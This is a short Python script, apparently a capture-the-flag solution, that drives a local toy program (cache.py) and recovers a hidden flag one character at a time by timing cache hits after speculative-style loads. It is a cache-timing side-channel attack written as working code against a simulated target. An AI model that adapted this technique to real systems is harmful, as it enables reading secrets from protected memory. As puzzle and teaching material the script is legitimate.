import subprocess


def issue_cmd(proc, cmd):
    proc.stdin.write('{}\n'.format(cmd))
    proc.stdin.flush()
    return float(proc.stdout.readline().strip())


def get_flag(proc):
    flag = []
    for addr in range(256):
        for guess in range(256):
            issue_cmd(proc, 'mvl a {}'.format(addr))
            issue_cmd(proc, 'ldi b a')
            issue_cmd(proc, 'clear')
            issue_cmd(proc, 'ldi c b')
            time = issue_cmd(proc, 'ld d {}'.format(guess))
            if time < 0.05:
                if guess == 0:
                    return ''.join(flag)
                print('found {}'.format(chr(guess)))
                flag.append(chr(guess))
                break


def main():
    proc = subprocess.Popen(['python', './cache.py'], stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE)
    flag = get_flag(proc)
    print(flag)
    proc.kill()


if __name__ == '__main__':
    main()
